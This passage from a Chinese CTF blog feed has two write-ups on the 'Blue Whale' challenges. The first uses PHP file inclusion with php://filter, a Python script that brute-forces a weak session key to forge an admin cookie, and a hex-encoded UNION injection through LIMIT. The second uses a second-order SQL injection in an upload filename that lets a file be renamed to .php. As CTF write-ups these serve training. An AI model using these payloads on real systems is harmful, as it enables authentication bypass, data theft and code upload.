class="string">'action'</span>];</span><br><span class="line">$mode=$_GET[<span class="string">'mode'</span>];</span><br><span class="line">$file=$action.<span class="string">'/'</span>.$mode.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的一个文件包含漏洞。用 <code>php://filter</code> 伪协议读取源码：</p><p><code>/index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index</code></p><p>但是这里读不出 <code>config.inc.php</code> 原因可以在 <code>index.php</code> 中看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if(!preg_match(&apos;/\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;])</span><br></pre></td></tr></table></figure><p>mode 中不能包含 <code>.</code></p><hr><p>共读取到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">common.php</span><br><span class="line">admin/index.php</span><br><span class="line">admin/login.php</span><br><span class="line">admin/setpagenum.php</span><br><span class="line">front/index.php</span><br><span class="line">front/login.php</span><br><span class="line">front/newnote.php</span><br><span class="line">front/register.php</span><br></pre></td></tr></table></figure></p><p>我们可以看看 <code>admin/index.php</code> 中是怎么验证是否登陆的（别问为什么一上来就看这个）：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p><p>调用了 <code>check_login</code> 和 <code>get_level</code> 函数，这两个函数在 <code>common.php</code> 中。我们先看看这个文件的开头：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/954b0b56403c004580c6b260c9279692.png" alt="公共文件开头"></p><p>很明显，这里进行了一些初始化操作。</p><p>再来看看两个验证函数：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/9dca48914066fb13807322ce25d465ab.png" alt="公共文件"></p><p>这里将 <code>cookie</code> 中的 <code>uid</code> 取出，以 <code>|</code>  分割，加密判断。</p><p>如果成功返回当前 <code>$_SESSION</code> 中的值，否则返回 <code>False</code>。如果没登陆，那此时的值为 <code>NULL</code> ，但是判断使用的是 <code>严格</code> 判断，即：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(check_login()!==<span class="keyword">false</span>&amp;&amp;get_level()!==<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>这两个函数的绕过方法是一样的，所以下一步我们的目标就是研究：</p><p><code>$userinfo[1]==encode($userinfo[0])</code></p><p>这个条件怎么成立，这个数组是我们可控的，我们可以跟进 <code>encode</code> 函数中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> md5($_SESSION[<span class="string">'SECURITY_KEY'</span>].$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难理解，翻上面发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6);</span><br></pre></td></tr></table></figure><p>来看看这个函数的实现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_str</span><span class="params">($lenth=<span class="number">16</span>)</span></span>&#123;</span><br><span class="line">   $rand=[];</span><br><span class="line">   $_str=<span class="string">"wh"</span>;</span><br><span class="line">   <span class="keyword">while</span>($lenth)&#123;</span><br><span class="line">   $rand[]=$_str[rand(<span class="number">0</span>,strlen($_str)<span class="number">-1</span>)];</span><br><span class="line">   $lenth--;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//    var_dump($rand);</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> implode($rand);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p> 随机取6位 <code>w</code> 或 <code>h</code> </p><hr><p> 整理一下思路：</p><p> 要想绕过登陆验证，就要让验证函数返回 <code>NULL</code>。</p><p> 函数返回 <code>NULL</code> 的条件为：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($userinfo[1]==encode($userinfo[0]))</span><br></pre></td></tr></table></figure><p> $userinfo 是我们可以控制的，唯一不确定的是 encode 函数中用到的 <code>$_SESSION[&#39;SECURITY_KEY&#39;]</code></p><p> 因为不对，所以我们写个脚本爆破：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">lst = itertools.product(&quot;wh&quot;, repeat=6)</span><br><span class="line">url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def m(s):</span><br><span class="line">    return md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in lst:</span><br><span class="line">    key = m(&apos;&apos;.join(i) + &apos;admin&apos;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    if r.text.find(&quot;not login&quot;) &lt; 0:</span><br><span class="line">        print(headers)</span><br></pre></td></tr></table></figure><p>很快就会输出 <code>Cookie</code>，添加上浏览器，再访问 后台的 <code>index</code> 即可。。</p><blockquote><p>踩坑</p></blockquote><p>这里还有个坑，就是如果你当前的 SESSION 已经登陆过前台，那么爆破就会失败。原因可能是 <code>$_SESSION</code> 中登陆的用户的 <code>level</code> 为 0，在 <code>get_level</code> 函数中会返回 <code>False</code></p><hr><p>现在我们已经登陆了后台，看看后台的代码：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p><p>这里拼接了个 <code>get_page_size()</code>，这个函数在 <code>common.php</code> 里，我们看看这个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function get_page_size()&#123;</span><br><span class="line">      $sql=&quot;select num from page&quot;;</span><br><span class="line">      $res=mysql_my_query($sql);</span><br><span class="line">      $row=$res-&gt;fetch_assoc();</span><br><span class="line">      return $row[&apos;num&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只做了很简单的查询。</p><p>我们会发现后台页面还有个设置页面（<code>setpagenum.php</code>），进去看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/16bfd11e40309e538040b0c702fd600b.png" alt="后台设置页面"></p><p>这个设置就是 <code>get_page_size</code> 查询并返回的表和字段，猜测关键点可能就在这了（别问为什么猜）。</p><p>可以看到，这里做了 <code>is_numeric</code> 的判断，判断是否是数字。</p><p>mysql 中允许这么玩：<br><code>select 0x313233;</code></p><p>这条语句会输出 <code>123</code>，也就是 ASCII 码。</p><p>但是不允许这么玩：</p><p><code>select &#39;0x313233&#39;;</code></p><p>注意这里加了单引号，此时输出 <code>0x313133</code></p><p>我们发现这里是没有加引号的，所以我们传进来的值会在执行时解析成 ASCII 码。如果这是故意留的洞，那该字段的属性就不会是 <code>int</code>。因为 <code>int</code> 就不能存储字符串了。</p><hr><p>回顾一下查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$page_size=get_page_size();</span><br><span class="line">$sql=&quot;select * from note  limit 0,&quot;.$page_size;</span><br></pre></td></tr></table></figure><p>思考能不能用这样的语句：select * from note  limit 0,1 union select 2 </p><p>（！！！ 5.7 以后 limit 必须要放在最后，5.7以前是可以的）</p><p>5.7 以后会报：<code>ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT</code></p><blockquote><p>利用</p></blockquote><p>那么现在就可以利用了：</p><p>在 <code>mysql</code> 里运行：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/997ec5b94098030380caea6f2dd04cc9.png" alt="mysql"></p><p>这样我们就可以很方便的获得 <code>16进制</code> 了（只要转成 ASCII 就可以了）。</p><p>加上 <code>0x</code> 填上去提交：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/5fca457a40b2c53b8013764d28921f51.png" alt="填"></p><p>到前台：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/f23e901240efe71180c386fb77034312.png" alt="后台首页"></p><p>可以看到 3  和 2 被显示出来了。。看回一开始拿到的数据库结构，发现有个<code>flags</code> 表和 <code>flag</code> 字段，构造一下就可以出来了。。</p><h3 id="突然的结束，是因为懒"><a href="#突然的结束，是因为懒" class="headerlink" title="突然的结束，是因为懒"></a>突然的结束，是因为懒</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;蓝鲸官网&quot;&gt;&lt;a href=&quot;#蓝鲸官网&quot; class=&quot;headerlink&quot; title=&quot;蓝鲸官网&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.whaledu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;蓝鲸官网&lt;/a&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://liey1.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸文件管理系统（塔主nb）</title>
    <link href="https://liey1.github.io/2018/09/09/%E8%93%9D%E9%B2%B8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://liey1.github.io/2018/09/09/蓝鲸文件管理系统/</id>
    <published>2018-09-09T09:33:07.960Z</published>
    <updated>2018-09-09T13:21:59.374Z</updated>
    
    <content type="html"><![CDATA[<h4 id="蓝鲸官网"><a href="#蓝鲸官网" class="headerlink" title="蓝鲸官网"></a><a href="http://www.whaledu.com/" target="_blank" rel="noopener">蓝鲸官网</a></h4><h4 id="本题源码"><a href="#本题源码" class="headerlink" title="本题源码"></a><a href="http://bmob-cdn-21455.b0.upaiyun.com/2018/09/09/da49d35740d0a254807e4ddcdbfb47e5.zip" target="_blank" rel="noopener">本题源码</a></h4><blockquote><p>题目描述：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蓝鲸为了整理自己的工具，开发了一个文件管理系统，本来对系统的功能很满意，可是为什么总有人把蓝鲸的文件名修改了？蓝鲸找到了机智的你帮助它审计代码~</span><br></pre></td></tr></table></figure><hr><p>这题一开始直接给了源码。</p><blockquote><p>首先先看看上传的代码（uplaod.php）：</p></blockquote><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/2211237940a78ddc809f87631c995c10.png" alt="upload.php" title="1"></p><p>这里两个关键点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 限制了文件的后缀名</span><br><span class="line">2. 插入进数据库</span><br></pre></td></tr></table></figure><p>首先想想能不能这样：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/fe674eac40edd39980ec7dcbc916c2ef.png" alt="test.php" title="test.php"></p><p>这样是不行得。。因为在下面的拼接文件名的时候用的也是这个后缀：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>]; <span class="comment">//此为上传的文件名</span></span><br></pre></td></tr></table></figure></p><blockquote><p>根据题目描述，我们看看 <code>rename.php</code>：</p></blockquote><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/56324f5e40ebc80380af5a84c3636eb2.png" alt="rename.php" title="rename.php"></p><p>这里的 <code>$req</code> 在 <code>common.inc.php</code> 中是这么定义的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach(array($_GET, $_POST, $_COOKIE) as $global_var) &#123;</span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123;</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似自动解析了吧。</p><hr><blockquote><p>采坑</p></blockquote><p>假设我们上传的文件名为：<code>test.jpg</code></p><p>这无论如何都会在新文件名后加上 <code>$result[&#39;extension&#39;]</code></p><p>在这里起初想绕过 <code>rename</code> ，即类似 <code>move_uploaded_file</code> 函数一样，传入  <code>windows</code> 文件名中不允许的字符，类似：<code>newname.php.php;.jpg</code> 或者 <code>newname.php.php/.jpg</code>(两个 <code>.php</code> 是因为在第22行会对<code>$newname</code>进行一次 <code>basename</code>操作)</p><blockquote><p>但是貌似 <code>rename</code> 函数会报错（总之就是不行，原谅我看不懂内核代码）</p></blockquote><hr><blockquote><p>放弃这个想法，看了师傅的 WP 后发现：</p></blockquote><p>关键点在 23行的 <code>update</code> 语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` set `filename`=&apos;&#123;$req[&apos;newname&apos;]&#125;&apos;, `oldname`=&apos;&#123;$result[&apos;filename&apos;]&#125;&apos; where `fid`=&#123;$result[&apos;fid&apos;]&#125;</span><br></pre></td></tr></table></figure><p>$result 是在 第13行 根据传入的文件名查询出来的。</p><p>这里把 <code>oldname</code> 字段设置成了 <code>$result[&#39;filename&#39;]</code>。</p><h5 id="这里的-result-‘filename’-我们是可控的，且没有做任何过滤。"><a href="#这里的-result-‘filename’-我们是可控的，且没有做任何过滤。" class="headerlink" title="这里的 $result[‘filename’] 我们是可控的，且没有做任何过滤。"></a>这里的 $result[‘filename’] 我们是可控的，且没有做任何过滤。</h5><p>虽然传入的时候经过了 addslashes 的过滤（在 common.inc.php 中），但是查询出来后却没有过滤。</p><p>可控有什么用呢？<br>前面分析过这里最大的问题在改的新名字会被强制加上 <code>$result[&#39;extension&#39;]</code>。但是这里是可以注入的，所以只要我们的文件名够骚，我们就能操作 <code>update</code> 语句，我们就可以将 <code>extension</code> 字段覆盖为空。</p><p>比如：<code>&#39;,extension=&#39;&#39;,filename=&#39;test.jpg</code>（最后要为 <code>.jpg</code> ）</p><p>此时数据库和文件夹里的情况：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d8d5dc2c40e738a380f2947902dcb9cb.png" alt="ans" title="ans"></p><p>此时去改名，传入文件名：<code>&#39;,extension=&#39;&#39;,filename=&#39;test</code>(去掉后缀)<br>新文件名传入：test</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/a91a00d1407f8a8380ae75892b9499fb.png" alt="new" title="new"></p><p>此时的sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql：update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test&apos; where `fid`=2</span><br></pre></td></tr></table></figure></p><p>再看看：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/60f7deec404c8b818043914aa7eab397.png" alt="new2" title="new2"></p><p>ok，成功踩坑。此时发现数据中的 filename 和 文件夹中的不同。下次 <code>rename</code> 的时候会找不到 <code>test</code> 文件（此时数据库中的 <code>extension</code> 已经为空）</p><h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><p>我们把上传的文件名改改：<code>&#39;,extension=&#39;&#39;,filename=&#39;test.jpg.jpg</code></p><p>此时的语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update `file` set `filename`=&apos;test&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;test.jpg&apos; where `fid`=3</span><br></pre></td></tr></table></figure></p><p>会发现把 <code>filename</code> 设置成了 <code>test.jpg</code> 了，此时数据库与文件夹一致（不想截图了。。）</p><p>再改次名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">oldname：test.jpg</span><br><span class="line">newname：test.php</span><br></pre></td></tr></table></figure></p><p>即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;蓝鲸官网&quot;&gt;&lt;a href=&quot;#蓝鲸官网&quot; class=&quot;headerlink&quot; title=&quot;蓝鲸官网&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.whaledu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;蓝鲸官网&lt;/a&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nothing。。。</title>
    <link href="https://liey1.github.io/2018/09/09/hello-world/"/>
    <id>https://liey1.github.io/2018/09/09/hello-world/</id>
    <published>2018-09-08T16:35:46.151Z</published>
    <updated>2018-09-09T07:30:00.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=":)"></a>:)</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;:)&quot;&gt;&lt;/a&gt;:)&lt;/h1&gt;
      
    
    </summary>
    
    
  </entry>
  
</feed>
